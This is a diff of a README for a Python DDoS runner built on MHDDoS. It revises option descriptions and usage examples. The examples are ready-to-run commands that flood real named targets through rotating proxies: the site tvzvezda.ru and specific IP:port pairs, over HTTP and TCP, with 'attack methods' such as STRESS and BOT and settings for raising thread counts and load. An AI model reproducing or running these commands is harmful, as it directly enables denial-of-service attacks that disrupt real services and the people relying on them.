@@ -23,13 +23,14 @@
     
     optional arguments:
       -h, --help             show this help message and exit
-      -t 100                 Number of threads per CPU core
-      -p 300                 How often to update the proxies
+      -t 100                 Number of threads per CPU core (default is 100)
+      -p 300                 How often to update the proxies (default is 300)
       --proxy-timeout 3      How many seconds to wait for the proxy to make a connection.
                              Higher values give more proxies, but with lower speed/quality.
-                             Parsing also takes more time
+                             Parsing also takes more time (default is 3)
 
-      --rpc 100              How many requests to send on a single proxy connection
+      --rpc 100              How many requests to send on a single proxy connection (default is 100)
+
       --http-methods GET     List of HTTP(s) attack methods to use.
                              Default is GET, STRESS, BOT, DOWNLOADER.
                              Refer to MHDDoS docs for available options
@@ -37,25 +38,25 @@
 
 # Examples
 
-HTTP(S) Layer 7 attack - randomly chosen method from --http-methods parameter (see above for defaults).
+For HTTP(S) targets, attack method is randomly selected from `--http-methods` option (see above for the default).
 
-    python3 runner.py target1 target2 target3
+    python3 runner.py https://tvzvezda.ru 5.188.56.124:9000 tcp://194.54.14.131:4477
 
-Target examples
+Target specification
 
-- HTTP(S) by URL - `http://tvzvezda.ru` | `https://tvzvezda.ru`
+- HTTP(S) by URL  - `https://tvzvezda.ru` or `http://tvzvezda.ru` 
 - HTTP by IP:PORT - `5.188.56.124:9000`
-- TCP by IP:PORT - `tcp://194.54.14.131:4477`
+- TCP by IP:PORT  - `tcp://194.54.14.131:4477`
 
 Increase load
 
     python3 runner.py -t 300 https://tvzvezda.ru
 
-Update proxies less often (every 600s)
+Update proxies less often (every 10 minutes)
 
     python3 runner.py -p 600 https://tvzvezda.ru
 
-More proxies
+Get more proxies (possibly lower quality)
 
     python3 runner.py --proxy-timeout 5 https://tvzvezda.ru
 
